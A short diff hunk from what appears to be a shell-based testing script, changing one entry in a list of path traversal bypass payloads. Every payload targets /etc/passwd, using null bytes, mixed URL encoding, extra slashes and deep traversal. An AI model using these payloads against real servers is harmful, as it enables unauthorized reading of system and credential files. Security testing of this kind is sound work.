@@ -158,7 +158,7 @@ declare -a BYPASS_TECHNIQUES=(
     "null_byte:../../../../etc/passwd%00"
     "approved_null:./languages/../../../../etc/passwd%00"
     "extra_slashes:..././..././..././..././etc/passwd"
-    "mixed_encoding:..%2f..%2f..%2f..%2fetc/passwd"
+    "mixed_encoding:..%2f..%2f..%2f..%2fetc%2fpasswd"
     "deep_traversal:../../../../../../../../../etc/passwd"
 )
 
